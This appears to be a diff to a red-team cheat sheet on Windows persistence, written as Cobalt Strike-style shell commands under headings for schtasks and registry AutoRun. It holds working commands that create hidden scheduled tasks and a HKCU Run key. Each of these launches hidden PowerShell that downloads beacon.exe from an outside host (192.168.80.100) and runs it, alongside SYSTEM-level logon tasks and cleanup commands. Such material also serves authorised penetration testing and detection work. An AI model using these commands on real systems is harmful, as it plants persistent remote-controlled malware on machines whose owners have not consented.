@@ -41,22 +41,21 @@ execute-assembly /root/SharPersist.exe -t service -n "Name" -m remove
 ```
 
 ### Task Scheduler (schtasks)
+There is a length limit on the tr value in the schtasks tool.
 ```powershell
 shell schtasks /create /sc hourly /mo 1 /tn evil /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c \"Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe\" "
+shell schtasks /create /sc onlogon /tn evil /tr "calc.exe" /ru SYSTEM
 shell schtasks /query /tn evil /V /FO LIST
 shell schtasks /run /tn evil
 shell schtasks /delete /tn evil
-shell schtasks /create /sc onlogon /tn evil /tr "calc.exe" /ru SYSTEM
 ```
 
 ### Registry AutoRun (reg)
+Requires admin access for "HKLM", also there is a length limit on the key value.
 ```powershell
-shell reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d calc.exe
-shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d calc.exe
-shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
-shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
+shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://192.168.80.100/beacon.exe','C:\windows\temp\beacon.exe'); Start-Process C:\windows\temp\beacon.exe\" "
+shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil
 ```
 
 ### Hide PowerShell Commands (VBS)
